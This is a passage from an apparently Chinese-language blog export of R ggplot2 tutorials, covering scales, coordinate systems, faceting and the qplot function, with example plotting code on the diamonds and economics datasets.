Good"),labels=c("A","B","C"))标度系列函数标度系列函数可以粗略的分为4类：位置标度：用于将连续型、离散型和日期-时间型变量映射到绘图区域，以及构造对应的坐标轴颜色标度：用于将连续型和离散型变量映射到颜色手动离散型标度：用于将离散型变量映射到我们选择的符号大小、线条类型、形状或颜色，以及创建对应的图例同一型标度：用于直接将变量值绘制为图形属性，而不去映射他们通用参数上面这些标度系列函数都会有一些参数，这些就是通用参数，下面简单介绍一下这些通用参数。namename：设置坐标轴或图例上出现的标签。可以使用三个辅助函数xlab()、ylab()、labs()来减少代码。123456789101112131415# 默认-左上p &lt;- ggplot(data = diamonds, mapping = aes(x = carat, y = price, color = factor(cut)))p &lt;- p + geom_point()# 添加x标签-右上p + scale_x_continuous("Diamonds carat")# 添加x标签（使用xlab()这个辅助函数）p + xlab("Diamonds carat")# 同时添加x、y及colour标度-左下p + labs(x = "Diamonds carat", y = "Diamonds price", colour = "Diamond Cut")# 添加x标度为表达式-右下p + xlab(expression(frac(carat,10)))limitslimits：固定标度的定义域。连续型标度接受一个长度为2的数值型向量离散型标度接受一个字符型向量我们可以通过设定limits来移除不想在图形上展示的数据，任何不在此范围内的数据将会被丢弃。12345678p &lt;- ggplot(data = diamonds, mapping = aes(x = carat, y = price, color = factor(cut)))p &lt;- p + geom_point()# 设定x轴的范围-左图p + scale_x_continuous(limits = c(0,3))# 设定colour的范围-右图p + scale_colour_hue(limits = "Fair")breaks、labelsbreaks表示在坐标轴/图例上哪些点的位置标标签labels表示标什么标签，若设定labels，则必须同时指定breaks。12345678p &lt;- ggplot(data = diamonds, mapping = aes(x = carat, y = price, color = factor(cut)))p &lt;- p + geom_point()# 设定x轴的坐标轴的值-左图p + scale_x_continuous(breaks = c(0,3))# 设定图例上的值-右图p + scale_colour_hue(breaks = "Fair")位置标度每幅图都一定拥有两个位置标度，一个指定水平位置（x标度），另外一个指定竖直位置（y标度）。ggplot2提供了连续型、离散型（针对因子型、字符型和逻辑型向量）以及日期型标度。连续型位置标度最常用的连续型位置标度是scale_x_continuous和scale_y_continuous，它们均将数据映射到x轴和y轴。而最有趣的变式是通过变换来生成的，每一个连续型标度都可以接受一个trans 参数，允许指定若干种线性或非线性的变换。下面是支持的变换：名称变换函数$f(x)$逆变换函数$f^{−1}(x)$asn$tanh^{−1}(x)$$tanh(y)$exp$e^x$$log(y)$identity$x$$y$log$log(x)$$e^y$log10$log_{10}(x)$$10^y$log2$log_2(x)$$2^y$logit$log(\frac{x}{1−x})$$\frac{1}{1+e(y)}$pow10$10^x$$log_{10}(y)$probit$\phi(x)$$\phi^{−1}(y)$recip$x^{−1}$$y^{−1}$reverse$−x$$−y$sqrt$x^{\frac{1}{2}}$$y^2$对于连续型位置标度，变换有简写形式，比如scale_x_continuous(trans = “log10”)可以简写为scale_x_log10()。参数trans对任意连续型标度均有效，但只有位置标度有简写形式。当然，可以直接对变量进行变换，而不使用标度变换。比如我们可以直接绘制log10(x)，而不去使用scale_x_log10()。这两种做法将在绘图区域生成完全相同的结果，但是坐标轴和刻度标签却是不同的。下面是一个对比：12345678# 自行变换log10()-左图p &lt;- ggplot(data = diamonds, mapping = aes(x = log10(carat), y = log10(price), color = factor(cut)))p &lt;- p + geom_point()# scale_x_log10()变换-右图p &lt;- ggplot(data = diamonds, mapping = aes(x = carat, y = price, color = factor(cut)))p &lt;- p + geom_point()p &lt;- p + scale_x_log10() + scale_y_log10()日期和时间日期和时间值基本上属于连续型标度，但在标注坐标轴时有着特殊的处理方式。目前我们仅支持属于date类的日期值和属于POSIXct类的时间值。如果你的日期和时间值是其他格式的，则需要as.Date()或as.POSIXct()对其进行转换。一共有三个参数可以控制坐标轴外观和刻度的位置：major、minor、format：major、minor：以时间的单位（即年月周日时分秒）来指定主要和次要断点的位置，并且允许以这些单位的倍数出现，比如，major = &quot;2weeks&quot;将在每隔两周的位置放置一个主刻度。如果未指定，日期刻度可以自动选出合适的默认值。format：指定了刻度标签的格式。下面是一个例子：1234567891011121314library(scales)# 时间序列-左上p &lt;- ggplot(data = economics, mapping = aes(x = date, y = psavert))p &lt;- p + geom_line()# 添加水平线-右上p &lt;- p + geom_hline(xintercept = 0, yintercept = 0, colour = "gray50")# 每隔10年为一个断点-左下p + scale_x_date(breaks = date_breaks("10 years"))# 使用年月日的格式仅显示在2004年内的图形-右下p + scale_x_date(limits = as.Date(c("2004-01-01","2005-01-01")), labels = date_format("%Y-%m-%d"))离散型位置标度离散型位置标度scale_x_discrete、scale_y_discrete将输入中的各个水平映射为整数。结果的顺序可用参数breaks进行控制，不想要的水平可以使用limits（或xlim、ylim）进行丢弃。由于我们经常也会在图形的非整点位置放置标签和标注，所以离散型位置标度也可以接受连续型的值。如果你尚未调整breaks或limits，某个因子水平的所在位置的数值表示可以使用as.numeric()进行计算：以从1开始的整数表示。离散型位置标度的参数主要是前面提到的通用参数。下面看一个例子：123456789# 默认方案-左图p &lt;- ggplot(data = diamonds, mapping = aes(cut, price))p &lt;- p + geom_boxplot()# 更改横轴标度-中图p + scale_x_discrete(labels = c("Fair" = "A","Good" = "B", "Very Good" = "C","Premium" = "D","Ideal" = "E"))# 移除不想展示的cut-右图p + scale_x_discrete(limits = c("Fair","Good"))颜色标度以下标度对边界色（colour）图形属性和填充色（fill）图形属性均有效。连续型颜色标度根据颜色梯度中的色彩数量划分，共有三类连续型颜色梯度（即渐变色）：scale_colour_gradient()、scale_fill_gradient()：双色梯度。参数low和high控制梯度两端的颜色scale_colour_gradient2()、scale_fill_gradient2()：三色梯度。顺序为低-中-高，这两种标度还在中点处拥有一个中间色scale_colour_gradientn()、scale_fill_gradientn()：自定义n色梯度颜色梯度常被用来展示一个二维表面的高度，用以描述第三维度，颜色的深浅代表着不同的值。例如描述地势高低时，地势的高低常常用颜色深浅来展现。下面我们用R自带的一个向量数据集volcano，因为ggplot2只接受数据框格式，因此我们先把数据转换成数据框格式：1234library(reshape2)volcano3d &lt;- melt(volcano)names(volcano3d) &lt;- c("x", "y", "z")下面展示双色梯度scale_fill_gradient()的用法：123456789# 默认参数-左图p &lt;- ggplot(data = volcano3d,mapping = aes(x,y,fill=z))p &lt;- p + geom_tile()# 控制填充颜色的值范围-中图p + scale_fill_gradient(limits = c(120,170))# 通过参数low与high，控制颜色在low与high之间渐变-右图p + scale_fill_gradient(low = "blue", high = "red")下面展示三色梯度scale_fill_gradient2()的用法：12345# 默认参数，即midpoint=0-左图p + scale_fill_gradient2(low = "blue", high = "red")# 设置midpoint=150-右图p + scale_fill_gradient2(low = "blue", high = "red", midpoint = 150)以上两图都设定了颜色由 blue 到 red 渐变，但是左图使用默认参数 midpoint=0，右图使用参数midpoint=150，而 z 值的范围是 94~195，所有他们在图中实际渐变色为，左图：浅红-红，右图：蓝-白-红。下面展示自定义n色梯度scale_fill_gradientn()的用法：12345# 手动设置颜色-左图p + scale_fill_gradientn(colours = c("black","blue","red","white"))# 采用R语言预设的调色盘-右图p + scale_fill_gradientn(colours = topo.colors(10))离散型颜色标度离散型数据有两种颜色标度。一种可以自动选择颜色，另一种可以手工从颜色集中选择颜色。默认的配色方案，即scale_colour_hue()、scale_fill_hue()，可通过沿着hcl色轮选取均匀分布的色相来生成颜色。这种方案对颜色较少时有比较好的效果，但对于更多不同的颜色就不好区分开来。另一种可选的方案是ColorBrewer配色。即scale_colour_brewer()、scale_fill_brewer()。要想了解所有的调色板，可以使用RColorBrewer::display.brewer.all()查看。我们可以用参数palette=”调色板名称或者数字”来使用。例如，使用第二个调色板时用palette = 2（等价于palette = &#39;YIOrBr&#39;）。123456789101112# 默认方案，即scale_colour_hue()-左上图p &lt;- ggplot(data = diamonds, mapping = aes(cut, price, fill = color))p &lt;- p + geom_boxplot()# 采用ColorBrewer配色-右上图p + scale_fill_brewer()# 采用ColorBrewer配色中第二个调色板-左下图p + scale_fill_brewer(palette = 2)# 采用ColorBrewer配色中'Spectral'调色板-右下图p + scale_fill_brewer(palette = "Spectral")手动离散型标度离散型标度scale_linetype()、scale_colour_manual()、scale_size_discrete()、scale_shape()是按一定的顺序将因子的水平映射到一系列取值中。如果想要定制这些标度，需要使用以下手动型标度创建新的标度：scale_linetype_manual()scale_colour_manual()scale_size_discrete()scale_shape_manual()手动型标度拥有一个重要参数values，我们可以用它来指定这个标度应该生成的值。下面是一个例子：12345678910111213# 默认颜色-左上图p &lt;- ggplot(data = diamonds, mapping = aes(x = carat, y = price, color = factor(cut)))p &lt;- p + geom_point()# 手动改变颜色-右上图p + scale_colour_manual(values = c("Fair" = "red","Good" = "yellow","Very Good" = "green","Premium" = "blue","Ideal" = "black"))# 默认大小-左下图p &lt;- ggplot(data = diamonds, mapping = aes(x = carat, y = price, size = factor(cut)))p &lt;- p + geom_point()# 手动改变大小-右下图p + scale_size_manual(values = c(10,8,6,4,2))同一型标度当你的数据能被R中的绘图函数理解时，即数据空间和图形属性空间相同时，可以使用同一性标度(identity scale)，这意味着此时无法仅从数据本身派生出有意义的图例，所以默认是不绘制图例。参考ggplot2入门与进阶（上）R数据可视化—-ggplot2之标度、坐标轴和图例详解ggplot2学习笔记之颜色标度]]></content>
      <categories>
        <category>R</category>
        <category>数据可视化</category>
      </categories>
      <tags>
        <tag>R</tag>
        <tag>数据可视化</tag>
        <tag>ggplot2</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[R数据可视化-ggplot2的坐标系]]></title>
    <url>%2Farchives%2F16cc1f7e.html</url>
    <content type="text"><![CDATA[在ggplot2中，为了得到更好的数据可视化效果，我们可能要用到一些坐标转换的操作。ggplot2包含了6种不同的坐标系：名字描述coord_cartesian笛卡尔坐标系coord_equal同尺度笛卡尔坐标系coord_flip翻转的笛卡尔坐标系coord_trans变换的笛卡尔坐标系coord_map地图射影coord_polar极坐标系笛卡尔坐标系笛卡尔坐标系参数说明：1coord_cartesian(xlim = NULL, ylim = NULL)xlim、ylim参数用来限定x、y轴的范围。1234567891011121314library(gridExtra)# 完整数据集-左p1 &lt;- ggplot(data = diamonds, mapping = aes(x = carat, y = price))p1 &lt;- p1 + geom_point()p1 &lt;- p1 + geom_smooth()# x的标度范围设置-中p2 &lt;- p1 + scale_x_continuous(limits = c(0,3))# x轴坐标系范围设置-右p3 &lt;- p1 + coord_cartesian(xlim = c(0,3))grid.arrange(p1,p2,p3,ncol=3)左图是完整的数据集，中图为x的标度范围设置，右图为x轴坐标系范围设置。标度的范围设置是对数据取子集，然后再重新拟合曲线。坐标系的放缩就是图像的放缩。上面的这个图看的不是很明显，下面看个更明显的例子：12345678910111213library(gridExtra)# 完整数据集-左p1 &lt;- ggplot(data = diamonds, mapping = aes(x = carat, y = price))p1 &lt;- p1 + stat_bin2d(bins = 10)# x的标度范围设置-中p2 &lt;- p1 + scale_x_continuous(limits = c(0,3))# x轴坐标系范围设置-右p3 &lt;- p1 + coord_cartesian(xlim = c(0,3))grid.arrange(p1,p2,p3,ncol=3)这里我们可以通过方块的大小很直观的发现，当设定标度范围时，方块的数目还是相同的，只是覆盖了更少数的区域，当设定坐标系范围时，方块数目变少，但它们覆盖的区域没变。坐标轴翻转1coord_flip()把x轴和y轴互换，没有特殊参数。12345678910111213141516library(gridExtra)# 正常数据集-左p1 &lt;- ggplot(data = diamonds, mapping = aes(x = carat, y = price))p1 &lt;- p1 + geom_point()p1 &lt;- p1 + geom_smooth()# 坐标轴属性改变-中p2 &lt;- ggplot(data = diamonds, mapping = aes(x = price, y = carat))p2 &lt;- p2 + geom_point()p2 &lt;- p2 + geom_smooth()# 坐标轴翻转-右p3 &lt;- p1 + coord_flip()grid.arrange(p1,p2,p3,ncol=3)左图是原散点图相应的平滑曲线中图互换两个属性变量，平滑曲线拟合的是旋转后的变量右图coord_flip()拟合原始数据，然后再翻转输出结果，就变成是以y为条件变量刻画x的曲线了坐标轴变换1coord_trans(x = "identity", y = "identity", limx = NULL, limy = NULL)坐标形式转换包括对数转换、平方根转换等，这里x和y的值可以是log10,log2或squal等，另外两个参数也是限定坐标范围。这个坐标轴变换函数coord_trans()和scale_x_log10()这类函数是有区别的：坐标轴变换函数是其他处理优先，最后作图时再取对数标度函数是先将数据取对数，然后再拿进来处理我们拿拟合曲线举例子：如果用scale_x_log10就相当于把x的数据取了对数放进来做回归，拟合出一条直线。如果用coord_trans则是先用原有数据进行回归，得到一条拟合直线之后再变换坐标轴，曲线也会被弯曲！1234567891011121314library(gridExtra)library(scales)# 正常数据集-左p1 &lt;- ggplot(data = diamonds, mapping = aes(x = carat, y = price))p1 &lt;- p1 + geom_point()# 标度变换-中p2 &lt;- p1 + scale_x_log10() + scale_y_log10() + geom_smooth(method = 'lm')# 坐标轴变换-右p3 &lt;- p2 + coord_trans(x = exp_trans(10),y=exp_trans(10))grid.arrange(p1,p2,p3,ncol=3)坐标系层面的变换发生再统计变换之后，会影响拟合的曲线形状。左图为克拉和价格的散点图中图为克拉和价格对数变换后的散点图，直线为回归曲线：log(y)=a+blog(x)右图将前面的图变换回去，标度还原，因此线性趋势变成指数形式，y=k(c^x)极坐标转换极坐标转换可以做出蜘蛛图或饼图的效果。1coord_polar(theta = "x", start = 0, direction = 1)theta可以选择x或y，表示外延的坐标start是坐标开始的角度，默认起始位置是12点钟下面是一个例子：12345678910111213library(gridExtra)# 柱状图-上图p1 &lt;- ggplot(data = diamonds, mapping = aes(x = factor(1), fill = cut))p1 &lt;- p1 + geom_bar()# 圆环图效果-下图左p2 &lt;- p1 + coord_polar(theta="x")# 饼图效果-下图右p3 &lt;- p1 + coord_polar(theta="y")grid.arrange(p2,p3,ncol=2)上图：当使用一个因子变量作为横轴，使用分类变量进行填充时，该柱形图变成了单条堆积柱形图。当theta指定为x时，柱形图的x轴会被指定为极坐标的x轴（圆周），而柱形图的y轴则会成为极坐标的y轴（半径）。当theta指定为y时，柱形图的y轴为被指定为极坐标的x轴（圆周），而柱形图的x轴则会成为极坐标的y轴（半径）。当有多个序列时：12345678910111213library(gridExtra)# 柱状图-上图p1 &lt;- ggplot(data = diamonds, mapping = aes(x = cut, fill = cut))p1 &lt;- p1 + geom_bar()# 南丁格尔玫瑰图效果-左p2 &lt;- p1 + coord_polar(theta="x")# 圆环图、圆条图效果-右p3 &lt;- p1 + coord_polar(theta="y")grid.arrange(p2,p3,ncol=2)当有多个序列时，我们可以通过极坐标转换可以实现圆环图、圆条图效果以及南丁格尔玫瑰图效果。12345678910111213library(gridExtra)# 堆叠柱状图-上图p1 &lt;- ggplot(data = diamonds, mapping = aes(x = color, fill = cut))p1 &lt;- p1 + geom_bar()# 堆叠玫瑰图效果-左p2 &lt;- p1 + coord_polar(theta="x")# 复杂的圆环图效果-右p3 &lt;- p1 + coord_polar(theta="y")grid.arrange(p2,p3,ncol=2)参考ggplot2 坐标系相关设置（coord）七、R数据可视化–ggplot2定位之坐标系详解R语言可视化——极坐标变换与衍生图表类型]]></content>
      <categories>
        <category>R</category>
        <category>数据可视化</category>
      </categories>
      <tags>
        <tag>R</tag>
        <tag>数据可视化</tag>
        <tag>ggplot2</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[R数据可视化-ggplot2的分面]]></title>
    <url>%2Farchives%2F12b79187.html</url>
    <content type="text"><![CDATA[分面(facet)是在一个页面上自动摆放多幅图形，这一过程先将数据划分为多个子集，然后将每个子集依次绘制到页面的不同面板中。ggplot2提供了两种分面类型：网格分面-facet_grid：生成一个2维的面板网格，面板的行与列通过变量来定义。本质是2维的。封装分面-facet_wrap：首先生成一个1维的面板条块，然后再分装到2维中。本质是1维的。网格分面-facet_grid网格分面生成的是一个2维的面板网格，面板的行与列通过变量来定义。本质是2维的。不进行分面不进行分面：即不使用函数facet_grid()或使用facet_null()函数，此时得到的是单独画板。1234p &lt;- ggplot(data = diamonds, mapping = aes(x = carat, y = price))p &lt;- p + geom_point()p &lt;- p + facet_null()p一行多列一行多列：纵坐标相同，用于y位置的比较。1234p &lt;- ggplot(data = diamonds, mapping = aes(x = carat, y = price))p &lt;- p + geom_point()p &lt;- p + facet_grid('. ~ cut')p电脑屏幕通常较宽，因此这个方向最合适数据的展示。一列多行一列多行：横坐标轴相同，利于x位置的比较，尤其是对数据分布的比较。1234p &lt;- ggplot(data = diamonds, mapping = aes(x = price))p &lt;- p + geom_histogram(binwidth = 30)p &lt;- p + facet_grid('cut ~ .')p多列多行我们通常都将数目最多的变量按列排放，这样可以充分利用屏幕的宽高比。1234p &lt;- ggplot(data = diamonds, mapping = aes(x = carat, y = price))p &lt;- p + geom_point()p &lt;- p + facet_grid('cut ~ color')pfacet_grid()函数的参数facet_grid()函数的全部参数如下：12facet_grid(facets, margins = FALSE, scales = "fixed", space = "fixed", shrink = TRUE, labeller = "label_value", as.table = TRUE, drop = TRUE)facets：分面参数margins：用于分面的包含每个变量元素所有数据的数据组scales：坐标刻度的范围，可以设定四种类型：fixed：表示所有小图均使用统一坐标范围free：表示每个小图按照各自数据范围自由调整坐标刻度范围free_x：表示可以自由调整x轴刻度范围free_y：表示可以自由调整y轴刻度范围space：这个参数要配合scales使用，如果为fixed（默认），所有小图的大小都一样，如果为free/free_x/free_y，小图的大小将按照坐标轴的跨度比例进行设置shrinks：这个参数和坐标轴刻度有关，如果为TRUE（默认）则按统计后的数据调整刻度范围，否则按统计前的数据设定坐标labeller：这个参数用来设定小图标签as.table：小图排列顺序有关的选项。如果为TRUE（默认）则按表格方式排列，即最大值（指分组level值）排在表格最后即右下角，否则排在左上角drop：是否丢弃没有数据的分组，如果为TRUE（默认），则空数据组不绘图margins我们可以用margins来绘制边际图。设定margins=TRUE可展示所有的边际图，或者margins=c(&quot;A&quot;,&quot;B&quot;)，列出你要展示的边际图的变量名称。12345678p &lt;- ggplot(data = diamonds, mapping = aes(x = price))p &lt;- p + geom_histogram(binwidth = 30)# 默认-左图p + facet_grid(facets = 'cut ~ .')# 展示所有的边际图（margins = TRUE）-右图p + facet_grid(facets = 'cut ~ .', margins = TRUE)scales固定标度可以让我们在相同的基准上对子集进行比较，观察在哪些地方各子集有相似的总体模式。而自由标度可以帮助我们发现更多细节，它在展示不同量纲的时间序列时非常有用。12345678p &lt;- ggplot(data = diamonds, mapping = aes(x = price))p &lt;- p + geom_histogram(binwidth = 30)# 每个分面中固定标度即横纵坐标范围相同-左图p + facet_grid(facets = 'cut ~ .', scales = 'fixed')# 自由标度即横纵坐标范围可变-右图p + facet_grid(facets = 'cut ~ .', scales = 'free')space12345678p &lt;- ggplot(data = diamonds, mapping = aes(x = price))p &lt;- p + geom_histogram(binwidth = 30)# 每个分面中固定标度即横纵坐标范围相同-左图p + facet_grid(facets = 'cut ~ .', scales = 'fixed', space = 'fixed')# space设置为free时，每列的宽度与该列的标度范围成比例-右图p + facet_grid(facets = 'cut ~ .', scales = 'free', space = 'free')封装分面-facet_wrap封装分面首先生成一个1维的面板条块，然后再分装到2维中。本质是1维的。facet_wrap()函数的参数facet_wrap()函数的全部参数如下：12facet_wrap(facets, nrow = NULL, ncol = NULL, scales = "fixed", shrink = TRUE, as.table = TRUE, drop = TRUE)前面已经介绍过网格分面的参数，这里的封装分面的参数也是类似的，下面介绍不同的几个参数：nrow：绘制图形的行数ncol：绘制图形的列数，一般nrow/ncol只设定一个即可默认设置12345# 默认设置p &lt;- ggplot(data = diamonds, mapping = aes(x = carat, y = price))p &lt;- p + geom_point()p &lt;- p + facet_wrap(~ color)p设置列12345# 通过ncol=2设置为两列p &lt;- ggplot(data = diamonds, mapping = aes(x = carat, y = price))p &lt;- p + geom_point()p &lt;- p + facet_wrap(~ color, ncol = 2)p分面与分组对比这两种绘图技巧都有相应的优缺点。在分面图形中，每个组别都在单独的面板中，相隔较远，组间无重叠。因此组与组之间重叠严重时，分面图形有一定的好处。不过这也会导致组间的细微差别难以被发现。使用图形属性区分各组时，各组将会离得很近甚至可能重叠，不过细微得差别将会容易被发现。123456789101112131415161718192021library(gridExtra)# 分组-左上p1 &lt;- ggplot(data = diamonds, mapping = aes(x = carat, y = price, colour = cut))p1 &lt;- p1 + geom_point()# 分面-右上p2 &lt;- ggplot(data = diamonds, mapping = aes(x = carat, y = price, colour = cut))p2 &lt;- p2 + geom_point()p2 &lt;- p2 + facet_grid('. ~ cut')# 分组-只显示回归线-左下p3 &lt;- ggplot(data = diamonds, mapping = aes(x = carat, y = price, colour = cut))p3 &lt;- p3 + geom_smooth(method = lm, se = F, fullrange = T)# 分面-只显示回归线-右下p4 &lt;- ggplot(data = diamonds, mapping = aes(x = carat, y = price, colour = cut))p4 &lt;- p4 + geom_smooth(method = lm, se = F, fullrange = T)p4 &lt;- p4 + facet_grid('. ~ cut')p &lt;- grid.arrange(p1,p2,p3,p4,ncol=2)我们可以使用color或者fill图形属性来为分面条形图上色。在散点图中，仅使用颜色区分各组，我们可能还没注意到图形重叠了，但是回归线却可以让我们看到Ideal、Premium、Good、Very Good被分组在一起，与Fair组相距甚远。分面与并列对比分面可绘制出与图形并列类似得图形效果。123456789101112library(gridExtra)# 并列-左图p1 &lt;- ggplot(data = diamonds, mapping = aes(x = color, fill = cut))p1 &lt;- p1 + geom_bar()# 分面-右图p2 &lt;- ggplot(data = diamonds, mapping = aes(x = color, fill = cut))p2 &lt;- p2 + geom_bar()p2 &lt;- p2 + facet_grid('. ~ cut')grid.arrange(p1,p2,ncol=2)我们可以使用color或者fill图形属性来为分面条形图上色。参考ggplot2学习笔记之分面六、R语言可视化–ggplot2定位之分面]]></content>
      <categories>
        <category>R</category>
        <category>数据可视化</category>
      </categories>
      <tags>
        <tag>R</tag>
        <tag>数据可视化</tag>
        <tag>ggplot2</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[R数据可视化-ggplot2中的qplot函数]]></title>
    <url>%2Farchives%2F8c7eb5d5.html</url>
    <content type="text"><![CDATA[qplot()是ggplot2的一个作图函数，qplot的意思是快速作图（quick plot）。数据集本文的所有绘图使用的都是ggplot2内置的diamonds数据集，便于我们聚焦于作图的细节。diamonds数据集包含了约54000颗钻石的价格和质量的信息。数据说明：反映钻石质量的四个“C”克拉重量：carat切工：cut颜色：color净度：clarity五个物理指标深度：depth钻面宽度：tablexyz1str(diamonds)1234567891011Classes &apos;tbl_df&apos;, &apos;tbl&apos; and &apos;data.frame&apos;: 53940 obs. of 10 variables: $ carat : num 0.23 0.21 0.23 0.29 0.31 0.24 0.24 0.26 0.22 0.23 ... $ cut : Ord.factor w/ 5 levels &quot;Fair&quot;&lt;&quot;Good&quot;&lt;..: 5 4 2 4 2 3 3 3 1 3 ... $ color : Ord.factor w/ 7 levels &quot;D&quot;&lt;&quot;E&quot;&lt;&quot;F&quot;&lt;&quot;G&quot;&lt;..: 2 2 2 6 7 7 6 5 2 5 ... $ clarity: Ord.factor w/ 8 levels &quot;I1&quot;&lt;&quot;SI2&quot;&lt;&quot;SI1&quot;&lt;..: 2 3 5 4 2 6 7 3 4 5 ... $ depth : num 61.5 59.8 56.9 62.4 63.3 62.8 62.3 61.9 65.1 59.4 ... $ table : num 55 61 65 58 58 57 57 55 61 61 ... $ price : int 326 326 327 334 335 336 336 337 337 338 ... $ x : num 3.95 3.89 4.05 4.2 4.34 3.94 3.95 4.07 3.87 4 ... $ y : num 3.98 3.84 4.07 4.23 4.35 3.96 3.98 4.11 3.78 4.05 ... $ z : num 2.43 2.31 2.31 2.63 2.75 2.48 2.47 2.53 2.49 2.39 ...1head(diamonds)caratcutcolorclaritydepthtablepricexyz0.23IdealESI261.5553263.953.982.430.21PremiumESI159.8613263.893.842.310.23GoodEVS156.9653274.054.072.310.29PremiumIVS262.4583344.204.232.630.31GoodJSI263.3583354.344.352.750.24Very GoodJVVS262.8573363.943.962.48下面我们从原始数据中随机选出100个样本作为新数据集dsmall，便于小数据的作图展示：12345# 让样本可重复set.seed(1410)# 原始数据的一个容量为100的随机样本dsmall &lt;- diamonds[sample(nrow(diamonds),100),]qplot()基本用法基本用法下面是钻石的价格和重量之间的关系：12345678910# 基本用法-左图qplot(carat, price, data = diamonds)# 这种相关关系似乎是指数型的，因此我们应该先对变量进行一些变换。# 变量的函数作为参数-中图qplot(log(carat), log(price), data = diamonds)# 变量的某种组合作为参数-右图# 钻石的体积（`x * y * z`表示）和重量之间的关系qplot(carat, x * y * z, data = diamonds)颜色、大小、形状和其他图形属性12345# 分组-颜色-左图qplot(carat, price, data = dsmall, colour = color)# 分组-形状-右图qplot(carat, price, data = dsmall, shape = cut)我们可以使用I()来手动设定图形属性。例如：colour = I(&quot;red&quot;)或size = I(2)。我们可以通过使用alpha图形属性来调整透明度，例如1/10，其分母表示经过多少次重叠之后颜色将变得不透明，这样我们可以看到大部分的点在哪里进行了重叠。12345# 透明度设置为1/10-左图qplot(carat, price, data = diamonds, alpha = I(1/10))# 透明度设置为1/200-右图qplot(carat, price, data = diamonds, alpha = I(1/200))几何对象geom我们可以通过改变几何对象画出任何一种类型的图形。二维变量关系：geom = &quot;point&quot;：散点图（默认）geom = &quot;smooth&quot;：拟合一条平滑曲线geom = &quot;boxplot&quot;：箱线胡须图geom = &quot;path&quot;和geom = &quot;line&quot;：数据点之间绘制连线一维分布：连续变量geom = &quot;histogram&quot;：直方图（默认）geom = &quot;freqplot&quot;：频率多边形geom = &quot;density&quot;：密度曲线离散变量geom = &quot;bar&quot;：条形图平滑曲线如果散点图中有非常多的数据点，那么数据展示的趋势就不太明显了，这时候，我们可以在图中添加一条平滑曲线。12345# 小数据集-左图qplot(carat, price, data = dsmall, geom = c("point", "smooth"))# 全部数据集-右图qplot(carat, price, data = diamonds, geom = c("point", "smooth"))我们可以通过span参数控制曲线的平滑程度。1qplot(carat, price, data = dsmall, geom = c("point", "smooth"), span = 0.2)箱型图和扰动点图当数据集包含了一个分类变量和一个连续变量时，我们可以通过箱型图和扰动点图来看连续变量是如何随着分类变量的变化而变化的。扰动点图可以显示所有的点，但是有图形重叠的问题。箱型图可以显示出分布的中位数和四分位数，信息更充分。12345# 扰动点图-左图qplot(color, price / carat, data = diamonds, geom = "jitter")# 箱型图-右图qplot(color, price / carat, data = diamonds, geom = "boxplot")我们可以用半透明度来解决扰动点图的图形重叠问题。12345678# 透明度设置为1/5-左图qplot(color, price / carat, data = diamonds, geom = "jitter", alpha = I(1/5))# 透明度设置为1/50-中图qplot(color, price / carat, data = diamonds, geom = "jitter", alpha = I(1/50))# 透明度设置为1/200-右图qplot(color, price / carat, data = diamonds, geom = "jitter", alpha = I(1/200))直方图和密度曲线图直方图和密度曲线图可以展示单个变量的分布。12345# 直方图-左图qplot(carat, data = diamonds, geom = "histogram")# 密度曲线图-右图qplot(carat, data = diamonds, geom = "density")在直方图中，应该尝试多种组距。当组距较大时，图形能反映数据的总体特征，当组距较小时，则能显示出更多的细节。12345678# 组距设置为1-左图qplot(carat, data = diamonds, geom = "histogram", binwidth = 1)# 组距设置为0.1-中图qplot(carat, data = diamonds, geom = "histogram", binwidth = 0.1)# 组距设置为0.01-右图qplot(carat, data = diamonds, geom = "histogram", binwidth = 0.01)如果要对不同组的分布进行对比，只需要再加上一个图形映射。12345# 密度图分组对比-左图qplot(carat, data = diamonds, geom = "density", colour = color)# 直方图分组对比-右图qplot(carat, data = diamonds, geom = "histogram", fill = color)条形图条形图几何对象会计算每一个水平下观测的数量，因此无需预先对数据进行汇总。下面是钻石颜色的条形图：12345# 普通条形图（钻石颜色）-左图qplot(color, data = diamonds, geom = "bar")# 按重量加权的条形图，即得到的是每种颜色的钻石的总重量-右图qplot(color, data = diamonds, geom = "bar", weight = carat) + scale_y_continuous("carat")时间序列中的线条图和路径图线条图和路径图常用于时间序列的可视化。线条图：点从左到右进行连接路径图：按照点在数据集中的顺序进行连接1str(economics)1234567Classes &apos;spec_tbl_df&apos;, &apos;tbl_df&apos;, &apos;tbl&apos; and &apos;data.frame&apos;: 574 obs. of 6 variables: $ date : Date, format: &quot;1967-07-01&quot; &quot;1967-08-01&quot; ... $ pce : num 507 510 516 512 517 ... $ pop : num 198712 198911 199113 199311 199498 ... $ psavert : num 12.6 12.6 11.9 12.9 12.8 11.8 11.7 12.3 11.7 12.3 ... $ uempmed : num 4.5 4.7 4.6 4.9 4.7 4.8 5.1 4.5 4.1 4.6 ... $ unemploy: num 2944 2945 2958 3143 3066 ...1head(economics)datepcepoppsavertuempmedunemploy1967-07-01506.719871212.64.529441967-08-01509.819891112.64.729451967-09-01515.619911311.94.629581967-10-01512.219931112.94.931431967-11-01517.419949812.84.730661967-12-01525.119965711.84.8301812345# 失业人口的比例-左图qplot(date, unemploy / pop, data = economics, geom = "line")# 失业星期数的中位数-右图qplot(date, uempmed, data = economics, geom = "line")分面比较不同分组可以通过图形属性（颜色和形状）：所有组绘制在同一张图中分面：数据分割成若干子集，然后创建一个图形的矩阵，将每个子集绘制到图形矩阵中下面第一张图展示的是频数，第二张图展示的是频率，频率图可以使得比较不同组的分布时不受到该组样本量大小的影响：1234567# 钻石重量的频数（按照颜色分组）-左图qplot(carat, data = diamonds, facets = color ~ ., geom = "histogram", binwidth = 0.1, xlim = c(0,3))# 钻石重量的频率（按照颜色分组）-右图qplot(carat, ..density.., data = diamonds, facets = color ~ ., geom = "histogram", binwidth = 0.1, xlim = c(0,3))语法说明：我们可以通过row_var ~ col_var的表达式进行指定窗格数。如果想指定一行或一列，可以使用.作为占位符..density..：这是一个新的语法，告诉ggplot2将密度而不是频数映射到y轴其他选项qplot中还有以下选项用于控制图形的外观：xlim、ylim：设置x轴和y轴的显示区间。例如：xlim = c(0, 20)log：一个字符型向量，说明哪个坐标轴应该取对数。例如：log = &quot;xy&quot;main：图形的主标题，可以是字符串或表达式。例如：main = &quot;plot title&quot;或main = expression(beta[1] == 1)xlab、ylab：设置x轴和y轴的标签文字，可以是字符串或表达式。123456789# 标题、坐标轴标签设置-左图qplot( carat, price, data = dsmall, xlab = "Price ($)", ylab = "Weight 